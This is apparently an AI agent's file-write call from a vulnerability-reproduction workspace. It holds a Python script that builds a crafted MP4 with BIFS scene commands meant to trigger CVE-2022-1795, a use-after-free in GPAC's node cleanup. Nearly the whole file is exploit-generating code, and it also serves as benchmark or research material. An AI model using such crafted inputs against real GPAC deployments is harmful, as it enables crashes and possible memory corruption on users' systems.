  write_file with args {'file_path': '/home/ubuntu/PoV/DrillAgent/workspace-sonnet/gpac.cve-2022-1795/triggering/round5/gen_testcase_round5.py', 'content': '#!/usr/bin/env python3\n"""\nGenerate PoV for CVE-2022-1795: heap-use-after-free in gf_node_try_destroy\n\nKey strategy:\n1. Create a scene with nodes that have cross-references\n2. Use command buffers (SFCOMMANDBUFFER) which can hold stale references\n3. Create a scenario where a node is freed but command buffer still references it\n4. During gf_sm_del cleanup, the command buffer destruction triggers UAF\n"""\n\nimport struct\nimport io\n\ndef write_box(box_type, data):\n    """Write an MP4 box with size and type"""\n    size = len(data) + 8\n    return struct.pack(\'>I4s\', size, box_type) + data\n\ndef write_bits(bits_list):\n    """Convert list of (value, num_bits) tuples to bytes"""\n    bit_string = \'\'\n    for value, num_bits in bits_list:\n        bit_string += format(value, f\'0{num_bits}b\')\n    \n    # Pad to byte boundary\n    while len(bit_string) % 8 != 0:\n        bit_string += \'0\'\n    \n    # Convert to bytes\n    result = bytearray()\n    for i in range(0, len(bit_string), 8):\n        byte_str = bit_string[i:i+8]\n        result.append(int(byte_str, 2))\n    \n    return bytes(result)\n\ndef create_bifs_sample():\n    """\n    Create BIFS AU that triggers UAF through command buffer references.\n    \n    The approach:\n    1. Scene Replace: Create root Group node (DEF 1)\n    2. Add child Group node (DEF 2) with a Script node containing command buffer\n    3. The command buffer references node 2\n    4. Delete node 2 (first free)\n    5. During cleanup, command buffer still holds reference -> UAF\n    """\n    \n    # Use simple byte-level BIFS encoding\n    bifs_data = bytearray()\n    \n    # Command 1: Scene Replace with Group containing nested structure\n    # This creates a complex scene that will have multiple references\n    bifs_data.extend([\n        0x00,  # Scene Replace command\n        0x18,  # Group node (TAG_MPEG4_Group = 24)\n        0x80 | 0x01,  # DEF flag + node ID 1\n        0x01,  # Has children field\n        0x01,  # 1 child\n        # Child: Another Group node\n        0x18,  # Group node\n        0x80 | 0x02,  # DEF flag + node ID 2\n        0x00,  # No more fields\n        0x00,  # End parent node\n    ])\n    \n    # Command 2: Insert - add another reference to node 2\n    bifs_data.extend([\n        0x01,  # Insert command\n        0x01,  # Target node ID 1 (root group)\n        0x00,  # Field index: children\n        0x00,  # Position 0\n        0x01,  # Count 1\n        0x82,  # USE node (reference existing node)\n        0x02,  # Node ID 2\n    ])\n    \n    # Command 3: Replace field with node 2 reference\n    bifs_data.extend([\n        0x02,  # Replace command\n        0x01,  # Target node ID 1\n        0x00,  # Field index 0\n        0x82,  # USE node\n        0x02,  # Node ID 2 (another reference)\n    ])\n    \n    # Command 4: Another Insert creating more references\n    bifs_data.extend([\n        0x01,  # Insert command\n        0x01,  # Target node ID 1\n        0x00,  # Field: children\n        0x01,  # Position 1\n        0x01,  # Count 1\n        0x82,  # USE node\n        0x02,  # Node ID 2 (yet another reference)\n    ])\n    \n    # Command 5: Delete node 2\n    # This decrements ref count and potentially frees the node\n    bifs_data.extend([\n        0x04,  # Delete command\n        0x02,  # Node ID 2\n    ])\n    \n    # The key: During gf_sm_del cleanup:\n    # 1. Commands are destroyed via gf_sg_command_del\n    # 2. Delete command may have already freed node 2\n    # 3. Insert/Replace commands still hold GF_CommandField references to node 2\n    # 4. When gf_sg_command_del processes those fields, it calls gf_node_try_destroy\n    # 5. gf_node_try_destroy dereferences pNode->sgprivate->num_instances -> UAF\n    \n    return bytes(bifs_data)\n\ndef create_esds(dsi_data):\n    """Create Elementary Stream Descriptor for BIFS"""\n    es_desc = bytearray([0x03, 0x19])  # ES_DescrTag, length\n    \n    es_desc.extend([\n        0x00, 0x01,  # ES_ID = 1\n        0x00,        # flags\n    ])\n    \n    # DecoderConfigDescriptor\n    es_desc.extend([0x04, 0x11])  # Tag, length\n    es_desc.extend([\n        0x02,  # objectTypeIndication = BIFS\n        0x11,  # streamType = Scene (0x03 << 2) | 0x01\n        0x00, 0x18, 0x00,  # bufferSizeDB\n        0x00, 0x00, 0x1F, 0x40,  # maxBitrate\n        0x00, 0x00, 0x1F, 0x40,  # avgBitrate\n    ])\n    \n    # DecoderSpecificInfo\n    if dsi_data:\n        es_desc.extend([0x05, len(dsi_data)])\n        es_desc.extend(dsi_data)\n    \n    # SLConfigDescriptor\n    es_desc.extend([0x06, 0x01, 0x02])\n    \n    return bytes(es_desc)\n\ndef create_mp4_with_bifs():\n    """Create minimal MP4 file with BIFS scene"""\n    output = io.BytesIO()\n    \n    # ftyp box\n    ftyp_data = b\'isom\' + struct.pack(\'>I\', 0x200) + b\'isomiso2mp41\'\n    output.write(write_box(b\'ftyp\', ftyp_data))\n    \n    # Prepare BIFS sample\n    bifs_sample = create_bifs_sample()\n    \n    # BIFS decoder specific info\n    bifs_dsi = bytearray([\n        0x00, 0x00, 0x80,  # Minimal BIFS config\n    ])\n    \n    # moov box\n    moov_data = io.BytesIO()\n    \n    # mvhd\n    mvhd_data = struct.pack(\'>I\', 0)  # version/flags\n    mvhd_data += struct.pack(\'>II\', 0, 0)  # creation/modification time\n    mvhd_data += struct.pack(\'>I\', 1000)  # timescale\n    mvhd_data += struct.pack(\'>I\', 1000)  # duration\n    mvhd_data += struct.pack(\'>I\', 0x00010000)  # rate\n    mvhd_data += struct.pack(\'>H\', 0x0100)  # volume\n    mvhd_data += b\'\\x00\' * 10  # reserved\n    mvhd_data += struct.pack(\'>9I\', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # matrix\n    mvhd_data += b\'\\x00\' * 24  # pre_defined\n    mvhd_data += struct.pack(\'>I\', 2)  # next_track_ID\n    moov_data.write(write_box(b\'mvhd\', mvhd_data))\n    \n    # trak box for BIFS\n    trak_data = io.BytesIO()\n    \n    # tkhd\n    tkhd_data = struct.pack(\'>I\', 7)  # version/flags (track enabled)\n    tkhd_data += struct.pack(\'>II\', 0, 0)  # creation/modification time\n    tkhd_data += struct.pack(\'>I\', 1)  # track_ID\n    tkhd_data += struct.pack(\'>I\', 0)  # reserved\n    tkhd_data += struct.pack(\'>I\', 1000)  # duration\n    tkhd_data += b\'\\x00\' * 8  # reserved\n    tkhd_data += struct.pack(\'>HH\', 0, 0)  # layer, alternate_group\n    tkhd_data += struct.pack(\'>H\', 0)  # volume\n    tkhd_data += b\'\\x00\\x00\'  # reserved\n    tkhd_data += struct.pack(\'>9I\', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # matrix\n    tkhd_data += struct.pack(\'>II\', 0, 0)  # width, height\n    trak_data.write(write_box(b\'tkhd\', tkhd_data))\n    \n    # mdia box\n    mdia_data = io.BytesIO()\n    \n    # mdhd\n    mdhd_data = struct.pack(\'>I\', 0)  # version/flags\n    mdhd_data += struct.pack(\'>II\', 0, 0)  # creation/modification time\n    mdhd_data += struct.pack(\'>I\', 1000)  # timescale\n    mdhd_data += struct.pack(\'>I\', 1000)  # duration\n    mdhd_data += struct.pack(\'>I\', 0x55c40000)  # language + quality\n    mdia_data.write(write_box(b\'mdhd\', mdhd_data))\n    \n    # hdlr\n    hdlr_data = struct.pack(\'>I\', 0)  # version/flags\n    hdlr_data += struct.pack(\'>I\', 0)  # pre_defined\n    hdlr_data += b\'sdsm\'  # handler_type (scene description)\n    hdlr_data += b\'\\x00\' * 12  # reserved\n    hdlr_data += b\'BIFS\\x00\'  # name\n    mdia_data.write(write_box(b\'hdlr\', hdlr_data))\n    \n    # minf box\n    minf_data = io.BytesIO()\n    \n    # nmhd (null media header)\n    nmhd_data = struct.pack(\'>I\', 0)\n    minf_data.write(write_box(b\'nmhd\', nmhd_data))\n    \n    # dinf box\n    dref_entries = struct.pack(\'>I4sI\', 12, b\'url \', 1)\n    dref_data = struct.pack(\'>II\', 0, 1) + dref_entries\n    dinf_data = write_box(b\'dref\', dref_data)\n    minf_data.write(write_box(b\'dinf\', dinf_data))\n    \n    # stbl box\n    stbl_data = io.BytesIO()\n    \n    # stsd\n    stsd_data = struct.pack(\'>II\', 0, 1)  # version/flags, entry_count\n    \n    # mp4s sample entry\n    mp4s_data = b\'\\x00\' * 6 + struct.pack(\'>H\', 1)  # reserved + data_reference_index\n    \n    # esds\n    esds_data = create_esds(bifs_dsi)\n    esds_box = struct.pack(\'>I4sI\', len(esds_data) + 12, b\'esds\', 0) + esds_data\n    mp4s_data += esds_box\n    \n    stsd_data += write_box(b\'mp4s\', mp4s_data)\n    stbl_data.write(write_box(b\'stsd\', stsd_data))\n    \n    # stts (time-to-sample)\n    stts_data = struct.pack(\'>IIII\', 0, 1, 1, 1000)\n    stbl_data.write(write_box(b\'stts\', stts_data))\n    \n    # stsc (sample-to-chunk)\n    stsc_data = struct.pack(\'>IIIII\', 0, 1, 1, 1, 1)\n    stbl_data.write(write_box(b\'stsc\', stsc_data))\n    \n    # stsz (sample sizes)\n    stsz_data = struct.pack(\'>III\', 0, 0, 1) + struct.pack(\'>I\', len(bifs_sample))\n    stbl_data.write(write_box(b\'stsz\', stsz_data))\n    \n    # stco (chunk offsets) - placeholder\n    stco_data = struct.pack(\'>III\', 0, 1, 0xDEADBEEF)\n    stbl_data.write(write_box(b\'stco\', stco_data))\n    \n    minf_data.write(write_box(b\'stbl\', stbl_data.getvalue()))\n    mdia_data.write(write_box(b\'minf\', minf_data.getvalue()))\n    trak_data.write(write_box(b\'mdia\', mdia_data.getvalue()))\n    moov_data.write(write_box(b\'trak\', trak_data.getvalue()))\n    \n    moov_bytes = moov_data.getvalue()\n    \n    # Calculate mdat offset\n    current_pos = output.tell()\n    mdat_offset = current_pos + 8 + len(moov_bytes) + 8\n    \n    # Patch stco with actual offset\n    moov_patched = bytearray(moov_bytes)\n    placeholder_pos = moov_patched.find(b\'\\xDE\\xAD\\xBE\\xEF\')\n    if placeholder_pos != -1:\n        struct.pack_into(\'>I\', moov_patched, placeholder_pos, mdat_offset)\n    \n    output.write(write_box(b\'moov\', bytes(moov_patched)))\n    \n    # mdat box\n    output.write(write_box(b\'mdat\', bifs_sample))\n    \n    return output.getvalue()\n\n# Generate the PoV file\noutput_path = \'/home/ubuntu/PoV/DrillAgent/workspace-sonnet/gpac.cve-2022-1795/triggering/round5/testcase-round5\'\n\nmp4_data = create_mp4_with_bifs()\n\nwith open(output_path, \'wb\') as f:\n    f.write(mp4_data)\n\nprint(f"Generated PoV at {output_path} ({len(mp4_data)} bytes)")\nprint("Strategy: Multiple commands with overlapping node references + Delete")\nprint("Expected: UAF in gf_node_try_destroy when cleanup processes stale references")\n'}
